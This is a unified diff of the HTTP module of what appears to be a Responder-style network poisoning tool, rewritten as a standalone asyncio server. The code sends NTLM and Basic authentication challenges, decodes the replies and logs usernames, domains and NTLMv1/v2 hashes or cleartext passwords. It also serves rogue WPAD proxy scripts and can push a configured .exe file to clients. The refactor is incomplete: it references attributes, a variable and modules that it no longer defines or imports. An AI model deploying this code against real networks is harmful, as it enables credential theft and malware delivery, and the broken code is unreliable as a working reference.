@@ -1,28 +1,34 @@
-import traceback
-import struct
-from base64 import b64decode
-import logging
-from servers.BASE import ResponderServer, ResponderProtocolTCP
+import asyncio
+import sys
 
-from utils import *
-from packets import NTLM_Challenge
-from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans,WEBDAV_Options_Answer
-from packets import WPADScript, ServeExeFile, ServeHtmlFile
+####self.soc.settimeout(1) ???????
 
-
-class HTTPProtocol(ResponderProtocolTCP):
+class HTTP_Proto(asyncio.Protocol):
 	
-	def __init__(self, server):
-		ResponderProtocolTCP.__init__(self, server)
+	def __init__(self, _httptemplate):
+		self._httptemplate = _httptemplate
+		self._buffer_maxsize = 10*1024
+		self._request_data_size = self._buffer_maxsize
+		self._transport = None
+		self._buffer = ''
 
-	def _connection_made(self, transport):
-		self._server.challenge = self._server.RandomChallenge()
 
-	def _data_received(self, raw_data):
-		return
+	def connection_made(self, transport):
+		print('New connection!' + str(transport))
+		self._transport = transport
 
-	def _connection_lost(self, exc):
-		return
+	def data_received(self, raw_data):
+		try:
+			data = raw_data.decode('utf-8')
+		except UnicodeDecodeError as e:
+			self._transport._write(str(e).encode('utf-8'))
+		
+		else:
+			self._buffer += data
+			self._parsebuff()
+
+	def connection_lost(self, exc):
+		print('Connection lost! ' + str(exc))
 
 	def _parsebuff(self):
 		if len(self._buffer) >= self._buffer_maxsize:
@@ -32,27 +38,27 @@ class HTTPProtocol(ResponderProtocolTCP):
 			#we have recieved all data for the request, and the request contained body data
 			self._parsereq()
 		
-		if self._buffer.find('\r\n\r\n') == -1:
-			return
-		
-		#we did, now to check if there was anything else in the request besides the header
-		if self._buffer.find('Content-Length') == -1:
-			#request contains only header
-			self._parsereq()
+		if self._buffer.find('\r\n\r\n') != -1: 
+			#we did, now to check if there was anything else in the request besides the header
+			if self._buffer.find('Content-Length') == -1:
+				#request contains only header
+				self._parsereq()
 			
-		else:
-			#searching for that content-length field in the header
-			for line in self._buffer.split('\r\n'):
-				if line.find('Content-Length') != -1:
-					line = line.strip()
-					self._request_data_size = int(line.split(':')[1].strip()) - len(self._buffer)
+			else:
+				#searching for that content-length field in the header
+				for line in self._buffer.split('\r\n'):
+					if line.find('Content-Length') != -1:
+						line = line.strip()
+						self._request_data_size = int(line.split(':')[1].strip()) - len(self._buffer)
 		
 	def _parsereq(self):
 		_httpreq = HTTPReq()
 		_httpreq.parse(self._buffer)
-		self._buffer = ''
+		print(str(_httpreq))
 		
-		self._server.handle(_httpreq, self._transport)
+		#self.log(logging.INFO,str(req))
+		#we should be dispatching the request object to the httptemplate now
+		self._httptemplate.handle(_httpreq, self._transport)
 
 class HTTPAuthorization():
 	def __init__(self):
@@ -84,7 +90,6 @@ class HTTPReq():
 
 		self.isWebDAV = False
 		self.isFirefox = False
-		self.isWpad = False
 
 	def parse(self, data):
 		self.rawdata = data
@@ -106,9 +111,6 @@ class HTTPReq():
 
 		self.method, self.uri, self.version = request.split(' ')
 
-		if self.uri.endswith('wpad.dat') or self.uri.endswith('.pac'):
-			self.isWpad = True
-
 		if self.method == 'PROPFIND':
 			self.isWebDAV = True
 
@@ -121,41 +123,43 @@ class HTTPReq():
 			self.authorization.parse(self.headers['authorization'])
 
 	def __str__(self):
-		return 'Method: %s , URL: %s, Version: %s' % (self.method, self.uri, self.version)
+		return '[Request] Method: %s , URL: %s, Version: %s' % (self.method, self.uri, self.version)
 
-class HTTP(ResponderServer):
-	def __init__(self):
-		ResponderServer.__init__(self)
-		self.challenge = None
+class HTTPServer:
+
+	def __init__(self, port, loop):
+		self._port = port
+		self._loop = loop
+		self._username_transports = {}
+		self.challenge = self.RandomChallenge()
 
 	def run(self):
-		coro = self.loop.create_server(
-							protocol_factory=lambda: HTTPProtocol(self),
+		coro = self._loop.create_server(
+							protocol_factory=lambda: HTTP_Proto(self),
 							host="",
-							port=self.port
+							port=self._port
 		)
 
-		return self.loop.run_until_complete(coro)
-
-	def modulename(self):
-		return 'HTTP'
+		return self._loop.run_until_complete(coro)
 
 	def handle(self, request, transport):
-		self.log(logging.DEBUG, 'Handling request %s' % str(request))
-
+		
 		try:
-			if request.isFirefox and request.isWpad:
-				self.log(logging.INFO,"WARNING! Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.")
-				self.log(logging.INFO,"WARNING! The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)")
+			if request.isFirefox:
+				self.log(logging.INFO,"[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.")
+				self.log(logging.INFO,"[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)")
 
 			Buffer = self.WpadCustom(request)
 			
 			if Buffer and self.settings['Force_WPAD_Auth'] == False:
 				transport.write(Buffer)
-				self.log(logging.ERROR, 'WPAD (no auth) file sent')
+				self.log(logging.ERROR, '[HTTP] WPAD (no auth) file sent to %s' % self.soc.getpeername()[0])
 			else:
-				Buffer = self.PacketSequence(request, transport)
+				Buffer, cont = self.PacketSequence(request)
+				self.log(logging.INFO,"PS returned %s" % repr(cont))
 				transport.write(Buffer)
+				if not cont:
+					return
 		
 		except Exception as e:
 			self.log(logging.INFO,'Exception! %s' % (str(e),))
@@ -174,35 +178,34 @@ class HTTP(ResponderServer):
 			return bytes.fromhex(self.settings['Challenge'])
 
 	def WpadCustom(self, request):
-		if request.isWpad:
-			if request.isFirefox:
-				Buffer = WPADScript(Payload=b"function FindProxyForURL(url, host){return 'DIRECT';}")
-				Buffer.calculate()
-				return Buffer.getdata()
+		Wpad = re.search(r'(/wpad.dat|/*\.pac)', request.rawdata)
+		if Wpad and request.isFirefox:
+			Buffer = WPADScript(Payload=b"function FindProxyForURL(url, host){return 'DIRECT';}")
+			Buffer.calculate()
+			return Buffer.getdata()
 
-			else:
-				Buffer = WPADScript(Payload=settings.Config.WPAD_Script.encode('ascii'))
-				Buffer.calculate()
-				return Buffer.getdata()
-		
+		if Wpad and not request.isFirefox:
+			Buffer = WPADScript(Payload=settings.Config.WPAD_Script.encode('ascii'))
+			Buffer.calculate()
+			return Buffer.getdata()
 		return False
 	
 	
 	# Handle HTTP packet sequence.
-	def PacketSequence(self, request, transport):
+	def PacketSequence(self, request):
 		# Serve the .exe if needed
 		if self.settings['Serve_Always'] is True or (self.settings['Serve_Exe'] is True and re.findall('.exe', data)):
-			return self.RespondWithFile(self.settings['Exe_Filename'], self.settings['Exe_DlName'])
+			return self.RespondWithFile(self.settings['Exe_Filename'], self.settings['Exe_DlName']), True
 
 		# Serve the custom HTML if needed
 		if self.settings['Serve_Html']:
-			return self.RespondWithFile(self.settings['Html_Filename'])
+			return self.RespondWithFile(self.settings['Html_Filename']), True
 
 		WPAD_Custom = self.WpadCustom(request)
 		# Webdav
 		if request.method == 'OPTIONS':
 			Buffer = WEBDAV_Options_Answer()
-			return Buffer.getdata(),
+			return Buffer.getdata(), True
 
 		if request.authorization is not None:
 			if request.authorization.type == 'NTLM':
@@ -216,7 +219,7 @@ class HTTP(ResponderServer):
 
 					Buffer_Ans = IIS_NTLM_Challenge_Ans()
 					Buffer_Ans.calculate(Buffer.getdata())
-					return Buffer_Ans.getdata()
+					return Buffer_Ans.getdata(), True
 
 				if Packet_NTLM == b"\x03":
 					NTLM_Auth = b64decode(''.join(request.authorization.data))
@@ -227,12 +230,12 @@ class HTTP(ResponderServer):
 					self.ParseHTTPHash(NTLM_Auth, module)
 
 				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
-					self.log(logging.INFO, 'WPAD (auth) file sent') 
-					return WPAD_Custom
+					self.log(logging.INFO, '[HTTP] WPAD (auth) file sent to %s' %  self.soc.getpeername()[0]) 
+					return WPAD_Custom, True
 				else:
 					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
 					Buffer.calculate()
-					return Buffer.getdata()
+					return Buffer.getdata(), False
 
 			elif request.authorization.type == 'Basic':
 				ClearText_Auth = b64decode(''.join(request.authorization.data))
@@ -247,32 +250,32 @@ class HTTP(ResponderServer):
 				})
 
 				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
-					self.log(logging.INFO, 'WPAD (auth) file sent') 
-					return WPAD_Custom
+					self.log(logging.INFO, '[HTTP] WPAD (auth) file sent to %s' %  self.soc.getpeername()[0]) 
+					return WPAD_Custom, True
 				else:
 					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
 					Buffer.calculate()
-					return Buffer.getdata()
+					return Buffer.getdata(), False
 		else:
 			if self.settings['Basic']:
 				Response = IIS_Basic_401_Ans()
-				self.log(logging.INFO, 'Sending BASIC authentication request') 
+				self.log(logging.INFO, '[HTTP] Sending BASIC authentication request to %s' %  self.soc.getpeername()[0]) 
 
 			else:
 				Response = IIS_Auth_401_Ans()
-				self.log(logging.INFO, 'Sending NTLM authentication request') 
+				self.log(logging.INFO, '[HTTP] Sending NTLM authentication request to %s' %  self.soc.getpeername()[0]) 
 
-			return Response.getdata()
+			return Response.getdata(), True
 
 	def RespondWithFile(self, filename, dlname=None):
 		
 		if filename.endswith('.exe'):
-			Buffer = ServeExeFile(Payload = self.ServeFile(filename), ContentDiFile=dlname)
+			Buffer = ServeExeFile(Payload = ServeFile(filename), ContentDiFile=dlname)
 		else:
-			Buffer = ServeHtmlFile(Payload = self.ServeFile(filename))
+			Buffer = ServeHtmlFile(Payload = ServeFile(filename))
 
 		Buffer.calculate()
-		self.log(logging.INFO, "Sending file %s to %s" % (filename, self.client))
+		self.log(logging.INFO, "[HTTP] Sending file %s to %s" % (filename, self.client))
 		return Buffer.getdata()
 
 	
@@ -299,7 +302,7 @@ class HTTP(ResponderServer):
 			self.logResult({
 				'module': module, 
 				'type': 'NTLMv1', 
-				'client': self.peername, 
+				'client': self.soc.getpeername()[0], 
 				'host': HostName, 
 				'user': User, 
 				'hash': LMHash+":"+NTHash, 
@@ -319,28 +322,20 @@ class HTTP(ResponderServer):
 			self.logResult({
 				'module': module, 
 				'type': 'NTLMv2', 
-				'client': self.peername, 
+				'client': self.soc.getpeername()[0], 
 				'host': HostName, 
 				'user': Domain + '\\' + User,
 				'hash': NTHash[:32] + ":" + NTHash[32:],
 				'fullhash': WriteHash,
 			})
 
-	def ServeFile(self, Filename):
-		with open (Filename, "rb") as bk:
-			return bk.read()
 
+def main(argv):
+	port = 80
+	loop = asyncio.get_event_loop()
+	httpserer = HTTPServer(port, loop)
+	server = httpserer.run()
+	loop.run_forever()
 
-class HTTPS(HTTP):
-	def modulename(self):
-		return 'HTTPS'
-
-	def run(self, ssl_context):
-		
-		coro = self.loop.create_server(
-							protocol_factory=lambda: HTTPProtocol(self),
-							host="",
-							port=self.port,
-							ssl=ssl_context
-		)
-		return self.loop.run_until_complete(coro)
+if __name__ == "__main__":
+	main(sys.argv)
